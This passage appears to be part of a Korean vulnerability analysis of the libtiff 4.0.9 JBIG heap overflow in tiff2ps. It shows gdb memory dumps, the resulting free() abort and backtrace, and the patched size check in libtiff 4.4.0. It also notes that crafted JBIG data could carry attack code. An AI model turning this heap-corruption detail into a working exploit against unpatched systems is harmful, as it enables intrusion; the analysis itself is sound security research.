+0x555555565eb0:    0x61442072    0x6e697772    0x6177412d    0x202e6472
+(gdb)
+0x555555565ec0:    0x6e6e6557    0x72684920    0x68615720    0x6e69736e
+0x555555565ed0:    0x656d206e    0x0a747373    0x646e6953    0x72697720
+0x555555565ee0:    0x65684320    0x77202c66    0x53206569    0x202e4654
+0x555555565ef0:    0x20726957    0x746c6168    0x73206e65    0x73626c65
+0x555555565f00:    0x65622074    0x42206d69    0x626d6f6c    0x72626e65
+0x555555565f10:    0x74686365    0x20747365    0x626d6f62    0x65666e65
+0x555555565f20:    0x530a7473    0x63617270    0x63696c68    0x4d206568
+0x555555565f30:    0x65747469    0x7a202c6c    0x44207275    0x6b636572
+(gdb)
+0x555555565f40:    0x6465472d    0x656b6e61    0x6552206e    0x67696e69
+0x555555565f50:    0x0a676e75    0x77206d49    0x65df6965    0x694b206e
+0x555555565f60:    0x6c657474    0x74696d20    0x706f4b20    0x65747366
+0x555555565f70:    0x66706e69    0x7473616c    0x7a207265    0x65642075
+0x555555565f80:    0x72656e69    0x65745320    0x67696e69    0x0a676e75
+0x555555565f90:    0x6f485b0a    0x0a5d6b6f    0x0a0a0a0a    0x0a0a0a0a
+0x555555565fa0:    0x62656953    0x6e756e65    0x75656e64    0x67697a6e
+0x555555565fb0:    0x6361202c    0x6e757468    0x75656e64    0x67697a6e
+(gdb)
+0x555555565fc0:    0x5b0a0a21    0x74726150    0x5d3a4920    0x6863490a
+0x555555565fd0:    0x62656720    0x65642027    0x654c206d    0x6f6b6978
+0x555555565fe0:    0x6164206e    0x69572073    0x6e657373    0x656e202c
+0x555555565ff0:    0x20276d68    0x206d6564    0x6863694e    0x64207374
+0x555555566000:    0x53207361    0x2c6e6965    0x68636920    0x64657220
+0x555555566010:    0x65642027    0x74532072    0x656d6d69    0x736e6920
+0x555555566020:    0x77654720    0x65737369    0x67202c6e    0x20276265
+0x555555566030:    0x206d6564    0x6420614a    0x4e207361    0x0a6e6965
+(gdb)
+0x555555566040:    0x63736542    0x7a74fc68    0x69642027    0x65532065
+0x555555566050:    0x69727563    0x202c7974    0x6e697262    0x50202767
+0x555555566060:    0x6b696e61    0x206e6920    0x20656964    0x74737948
+0x555555566070:    0x65697265    0x646e7520    0x746e6520    0x6865697a
+0x555555566080:    0x65442027    0x6d656e69    0x626c4120    0x73206d75
+0x555555566090:    0x656e6965    0x656f5020    0x0a656973    0x63727544
+0x5555555660a0:    0x68637368    0x20657561    0x6e696544    0x63532065
+0x5555555660b0:    0x62696568    0x202c6e65    0x27626567    0x72656420
+(gdb)
+=======================================================
+
+위 결과의 0x555555565fe8 부분을 보면 pImage의 데이터가 인접한 청크의 데이터
+까지 덮어쓰고 있다는 것을 알 수 있다. 이는 추후의 메모리 할당/해제에서 문제를
+발생시킨다. 이때 _TIFFmemcpy에 복사할 데이터 크기로 전달된 값은 다음과
+같이 확인할 수 있다.
+
+=======================================================
+(gdb) call (int) jbg_dec_getsize(&decoder)
+$1 = 6039
+(gdb)
+=======================================================
+
+이제 아무런 중지점없이 프로그램을 계속 진행시켜보자. 그럼 다음과 같이
+인접한 청크의 데이터를 덮어쓴 것으로 인해 에러가 발생하게 된다.
+
+=======================================================
+(gdb) cont
+Continuing.
+a4a99a8d8c9adfcea2f5ac8f8d9a91988c1b8b859adf99038ddfb99e978d8b94908c8b
+9a91df8a919bdfaf9a91918f931b8b859af5a89a9693dfb69c97df99038ddf8c90939c
+979adfbe91931b8c8c9ad3ab8d9a919bdf8a919bdf9b9e8cdf939a8b858b9adfb79a92
+9bdf8c9a8b859af5b29e20989a8c9c97919a969b9a8d8b9adfb48d9e989a91889a968b
+9ad3df94909292df979e938bdf9b9a91dfbe8b9a92df9e91f5a8968ddf8c8b9a979a91
+df9691df989e91859a8ddfbd9e919b9d8d9a968b9adf899093939a8ddfab9e8b9a919b
+8d9e9198d3df9a918b9e8d8b9a91df9b9e9191f5a8969adfba8990938a8b969091df9b
+969adfba8d9b9adf9691dfb6978d9a92dfa89a8d9b9a989e9198d3df889e8d8b9a8b9a
+91df939e9198f5a89a9191df9a978d93969c97df881b978d8bd3df9b9e9191df9a8d99
+1b978d8bdf929e91df889e9191f5b9908d9a899a8ddf86908a9198df9e9d9a8dd3df9a
+86c5dfddb99e968ddf8f939e86deddd39b9e8cdf968c8bdf989a919e8adf88969adf9d
+9a96dfac9a8d989a9695f5ba8cdf949092928bdf989e9185df9e8a99df9b9a91dfbe91
+939e8a99df9e91f5be8a99df8a918c9a8d9a8ddfb39e8a999d9e9791df9d8d9e8a9c97
+8bdf929e91df4b919a91dfbc9e8d9e899e91f5bb9a8ddfa89a98df968c8bdf979e8d8b
+df88969adfb4908f998c8b9a96918f99939e8c8b9a8d8c8b8d9e8c8c9a91df919e9c97
+dfb49e8c9e9c978c8b9e91f5b69c97df929e9c97df9b9a91dfb39a9697889e989a91df
+94939e8ddf8a919bdf919e9c97df9b8d9a96dfab9e989a91df889e8df5b1969c978b8c
+df9a9691939e9b9a919b9a8ddf9e938cc5dfdddfac9c979a96919d9e8ddf949a96919a
+8ddf9b9ededdf5a89a9191dfbe8d9d9a968bdf97969a8ddf91969c978bdfb48d9e998b
+df929e93dfa89a98df968c8bd3df88969b9a8d939a98df9a8cdef5bb9a9191df9e938c
+df911b9c978c8b9a8cdf9d9a889a98d8df969c97dfab8d1b989a8cd3df9e938cdf881b
+8ddf9a8cdfab9a8b8d968cf5aa919bdf918a8ddf9a9691df8f9e9e8ddfb296918a8b9a
+91df8c8f1b8b9a8ddf92968c8c8bdf929e91df9692dfae8a9e9b8d9e918b9a91dfbd9a
+8b9ef5aa918c9a8d9a91dfba96918c9c97939e98df9691df899a8d99938a9c978b9a91
+dfb19a888b9091929a8b9a8df5f5a4b7909094a2f5b4908f99dfac8b9a9691dfaf9993
+9e8c8b9a8ddfd7c787d6f5f5a4a99a8d8c9adfcda2f5b99e978d9a91dfb99693929adf
+88969adfb386919c97d3dfb3908c8bdfb7969897889e86d3df949a9691dfbe968d8f93
+9e86f5b79692929a93999e978d8b8c949092929e919b90df9e8a99df9b9a92dfa89a98
+df858a8ddfb89e9198889e86f5aa918c969c978b9d9e8d9adfab8a8d9d8a939a91859a
+91d3df9b9a9191df9b9a8ddfad8a99df9a96938bdf8a918cdf89908d8d9e8a8cf5b196
+9c978bdf8f9e9c949d9e8dd3df88969adfac9c979e9393d1dfb29a96939a918c8b9a96
+919adf9d9a9692dfbb9e8a9a8d939e8a99f5bd9a999e978d4b91df9b969adf8c9c9796
+9a999adfbd9e9791d3df88969adfaf9e8d968cd2bb9e949e8df5b59e98df899a8d9390
+8d9a919a8cdfa8968c8c9a91df8588968c9c979a91dfb29a94949edf8a919bdfb29a9b
+96919ef5b29a978ddfb99691989a8ddf9692dfac8f969a93df9e938cdf9e93939adfbe
+8d929adf899091dfb49e9396929ef5ba8a8d9adfab8d9a99999a91df9a99999a948b96
+89d3df88969adfb49091999a8d9a91859a91df039d9a8d8cdfb49396929ef5bd968cdf
+97969a8d979a8ddf989691984b8cdf988a8bd3df9b909c97dfb39edfb79e96919ad3df
+858a89969a93dfa88a8bf5b49092929a91df8c9a938b9a91df9e93939a9691d1ddb69c
+97df929a9691dfcadf989a989a91df9a96919a91ddf5b48d8a92929adfab908a8d9a91
+df9e8a99dfab90918c8f8a8d9a91f5b48a92968b9a9adf9e8a99dfb09b868c9a9ad3df
+889a979a91df92968bdfba99999a8bdf9b8a8d9c97df9b969adfac91968f9a8dd2be93
+939a9af5bb8adf9e97918c8bdf918a8ddf889e8cdf949092928bd3df8c8a9c978c8bdf
+9b9a91dfa89a919b9a8f8a91948bdf9e92dfb7908d968590918bf5bb9a9691dfb19e9c
+978d969c978b9a919b969a918c8bdf880397938bdf919e9c97dfac8f8a8d9a91df9e91
+df9b9a8ddfb98d90918bf5a89a9693dfb6918c8b9691948bdf8a918cdf91969a929e93
+8cdf939691948bd3df8c8b9a979a91df88968ddf9b9edf8890df88968ddf8c96919bf5
+bb969adf9890939b9a919adfb2968b8b9ad1dfb99e919bdf9b9a91dfa89a98df9b8a8d
+9c978cdfb39e9d868d96918b97f5ad038c8b9a91df9e8a99df88969adfa9969c8b908d
+d2bc979e8d93969ad3df8b9e8d919a91df9b969adfad038c8b8a91988c96919b8a8c8b
+8d969af5b390949e939adfad9e8f908d8b9e989ad3dfaf8d96929adfab96929ad3dfbc
+d1bad1abf5f5a4b7909094a2f5f5a4a99a8d8c9adfcca2f5b4939e8dd3df9b9e8c8cdf
+ba8d949a91918b91968cdf979e8d8bdf8c9a9691df949e9191d3df88969adf9b9e8cdf
+b79e8d929e9191989a8c8b1b919b91968cf5a8968d9bdfbb968ddf89969a93939a969c
+978bdf858a92dfa99a8d971b919891968cf5ddb59a8b858bdf9d8d969198df969791df
+91969c978bdf9691dfbd9a9b8d1b919891968cddf5ac90918c8bdf9b8d9a97dfb69c97
+df9b8a8d9c97df88969adfba93dfb1960e908cf5b4908f9991038c8c9adf94919e9c94
+9a91df9b9e9191f5b89a9d9a91df9b9a91dfab9091df9e91df88969adf9691dfad9092
+d3dfac9e928f969a8b8d9691908cf5be9d8c9e9c949a91df88969adfa99a919a9b9698
+df889a8d9b9a91df88968ddf9a97df91969c978bf5b29e9c978bdf9a8a9c97df9b9edf
+949a96919adfb89a9b9e91949a91df9b8d8a92f5a8968ddf8f9e9c949a91df9b9a91df
+ae8a9e918b9a918c8f8d8a9198d3df88969adf8c904b91dfaf9e9e8ddfba939a999e91
+8b9a91958a91989a91f5b2968bdf8a91989a8c8f9e938b9a919a91dfa58a91989a91df
+8f8d1b988bdf929a9691dfb28a919bdf929a9691dfaa92999a939bf5a81b978d9a919b
+df9a8ddf939e8a8bdf88969a4b91dfb78a919bdf9d9a93938bd3df929a93948bdf929a
+9691dfb89a97968d91df929a96919adfaa92889a938bf5b4939e8dd3df9b9e8c8cdf96
+978ddf9b8d9e8a998c8b9a978bd3df999e93938cdf8a918c9a8d9adfad9a9c97918a91
+98df9e8a99989a978bf5ac9a969bdf96978ddf9692dfbe8d8c9c97d3df88969a4b91df
+bd909b868f9e9c949a8ddf9b9a8ddf9b8d9e8a99989a978bf5b79e8d8bdf889a9191df
+929e91df9b8d9e8a99df8f9e8f8f9a91df9d939a969d8bd3df88969adfb69c97df9e8a
+99df929a96919a8ddfb496919b979a968bf5b691dfbd909c978a92d2a89e8b8b9a918c
+9c979a969bc5dfac9e8a9992908d9bd3dfb4908f8fd2dfbd908d9b8c8b9a96919b9e8c
+97969198f5ab908fdf8c929e8c979691d3df88969adf9b9a8ddfbb9e8d889691d2be88
+9e8d9bd1dfa89a9191dfb6978ddfa89e97918c969191df929a8c8c8bf5ac96919bdf88
+968ddfbc979a99d3df88969adfacabb9d1dfa8968ddf979e938b9a91df8c9a939d8c8b
+df9d9a9692dfbd9390929d9a919d8d9a9c978b9a8c8bdf9d90929d9a91999a8c8bf5ac
+8f8d9e9c9793969c979adfb2968b8b9a93d3df858a8ddfbb8d9a9c94d2b89a9b9e9194
+9a91dfad9a969196988a9198f5b692df889a96209a91dfb4968b8b9a93df92968bdfb4
+908f998c8b9a96918f99939e8c8b9a8ddf858adf9b9a96919a8ddfac8b9a969196988a
+9198f5f5a4b7909094a2f5f5f5f5f5f5f5f5f5ac969a9d9a918a919b919a8a91859698
+d3df9e9c978b8a919b919a8a91859698def5f5a4af9e8d8bdfb6c5a2f5b69c97df989a
+free(): invalid next size (normal)
+
+Program received signal SIGABRT, Aborted.
+__pthread_kill_implementation (no_tid=0, signo=6, threadid=140737350077312) at ./nptl/pthread_kill.c:44
+44    ./nptl/pthread_kill.c: No such file or directory.
+(gdb)
+=======================================================
+
+이렇게 취약점이 트리거됨을 알 수 있다. 그렇다면 이 에러가 발생한 지점은
+어디일까?
+
+=======================================================
+(gdb) bt
+#0  __pthread_kill_implementation (no_tid=0, signo=6, threadid=140737350077312)
+	at ./nptl/pthread_kill.c:44
+#1  __pthread_kill_internal (signo=6, threadid=140737350077312)
+	at ./nptl/pthread_kill.c:78
+#2  __GI___pthread_kill (threadid=140737350077312, signo=signo@entry=6)
+	at ./nptl/pthread_kill.c:89
+#3  0x00007ffff7c75476 in __GI_raise (sig=sig@entry=6)
+	at ../sysdeps/posix/raise.c:26
+#4  0x00007ffff7c5b7f3 in __GI_abort () at ./stdlib/abort.c:79
+#5  0x00007ffff7cbc6f6 in __libc_message (action=action@entry=do_abort,
+	fmt=fmt@entry=0x7ffff7e0eb8c "%s\n") at ../sysdeps/posix/libc_fatal.c:155
+#6  0x00007ffff7cd3d7c in malloc_printerr (
+	str=str@entry=0x7ffff7e117f8 "free(): invalid next size (normal)")
+	at ./malloc/malloc.c:5664
+#7  0x00007ffff7cd5d5c in _int_free (av=0x7ffff7e4cc80 <main_arena>,
+	p=0x5555555654b0, have_lock=<optimized out>) at ./malloc/malloc.c:4596
+#8  0x00007ffff7cd84d3 in __GI___libc_free (mem=<optimized out>)
+	at ./malloc/malloc.c:3391
+#9  0x00007ffff7f7dd79 in _TIFFfree (p=<optimized out>) at tif_unix.c:330
+#10 0x000055555555c81e in PSDataBW (
+	fd=fd@entry=0x7ffff7e4d780 <_IO_2_1_stdout_>, tif=0x0,
+	tif@entry=0x5555555642a0, w=w@entry=150, h=h@entry=150) at tiff2ps.c:2741
+#11 0x000055555555caf2 in PSpage (fd=0x7ffff7e4d780 <_IO_2_1_stdout_>,
+--Type <RET> for more, q to quit, c to continue without paging--
+	tif=0x5555555642a0, w=150, h=150) at tiff2ps.c:2394
+#12 0x000055555555d7cd in TIFF2PS (
+	fd=fd@entry=0x7ffff7e4d780 <_IO_2_1_stdout_>,
+	tif=tif@entry=0x5555555642a0, pgwidth=pgwidth@entry=0,
+	pgheight=pgheight@entry=0, lm=lm@entry=0, bm=bm@entry=0,
+	center=center@entry=0) at tiff2ps.c:1612
+#13 0x0000555555556be9 in main (argc=3, argv=0x7fffffffdfe8) at tiff2ps.c:479
+(gdb)
+=======================================================
+
+위의 스택 조사 결과를 보면 PSDataBW()가 호출하는 _TIFFfree()에서 문제가
+발생하였음을 알 수 있다. 즉, PSDataBW()에서 tf_buf를 해제할 때 에러가
+발생하고 이는 앞의 _TIFFmemcpy에서 인접 청크의 데이터를 덮어쓴 것으로
+인한 것이다. 따라서 tf_buf가 해제될 때의 상황을 충분히 검토한다면 JBIG으로
+인코딩된 공격코드를 주입하여 실질적인 공격을 수행할 수 있을 것이다.
+
+---[ 4. libtiff 4.4.0
+ [1]과 여기서 다룬 취약점은 libtiff 4.0.9를 포함하는 버전들을 대상으로 한다.
+물론 이 취약점에 대한 패치가 진행되어 최신 버전인 libtiff 4.4.0은 다음과
+같이 JBIGDecode 함수를 구현한다.
+
+---
+libtiff 4.4.0의 JBIGDecode 함수 (크기 검사하는 부분 발췌)
+=======================================================
+static int JBIGDecode(TIFF* tif, uint8* buffer, tmsize_t size, uint16 s)
+{
+	struct jbg_dec_state decoder;
+	int decodeStatus = 0;
+	unsigned char* pImage = NULL;
+	unsigned long decodedSize;
+	(void) s;
+...
+	decodedSize = jbg_dec_getsize(&decoder);
+	if( (tmsize_t)decodedSize < size )
+	{
+	    TIFFWarningExt(tif->tif_clientdata, "JBIG",
+	                   "Only decoded %lu bytes, whereas %lu requested",
+	                   decodedSize, (unsigned long)size);
+	}
+	else if( (tmsize_t)decodedSize > size )
+	{
+	    TIFFErrorExt(tif->tif_clientdata, "JBIG",
+	                 "Decoded %lu bytes, whereas %lu were requested",
+	                 decodedSize, (unsigned long)size);
+	    jbg_dec_free(&decoder);
+	    return 0;
+	}
+...
+}
+=======================================================
+
+---[ References
+[1] GOOGLE SECURITY RESEARCH,
+"libtiff 4.0.9 - Decodes Arbitrarily Sized JBIG into a Target Buffer",
+EXPLOIT DATABASE BY OFFENSIVE SECURITY, 2018, [Online]. Available:
+https://www.exploit-db.com/exploits/45694, [Accessed Jul. 10, 2022]
+
+[2] dlemstra, "ImageMagick/jbig", 2021, [Online]. Available:
+https://github.com/ImageMagick/jbig, [Accessed Jul. 10, 2022]
